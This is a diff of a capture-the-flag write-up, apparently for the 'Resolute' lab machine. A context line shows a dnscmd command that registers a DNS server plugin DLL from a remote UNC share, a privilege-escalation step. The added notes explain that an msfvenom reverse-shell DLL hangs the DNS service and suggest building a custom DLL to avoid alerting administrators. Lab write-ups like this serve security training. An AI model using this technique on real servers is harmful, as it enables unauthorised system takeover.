@@ -129,5 +129,5 @@ resolute$  dnscmd Resolute.megabank.local /config /serverlevelplugindll \\10.10.
 
 ## Learnings from [ippsec walkthrough](https://www.youtube.com/watch?v=8KJebvmd1Fk)
 
-TODO
+- He does pretty much the same that I did. There is one key takeaway though. When leveraging the user ```ryan``` to achieve privesc, we risk hanging the DNS server. That's something we cannot risk in a real-life scenario. It would be a red flag for any system administrator. This is because msfvenom, when creating the DLL, doesn't use a fork or thread to execute the reverse shell command. It's a blocking call until the reverse shell dies or returns the return code. The solution is generating the DLL ourselves. He explains that very nicely.
 
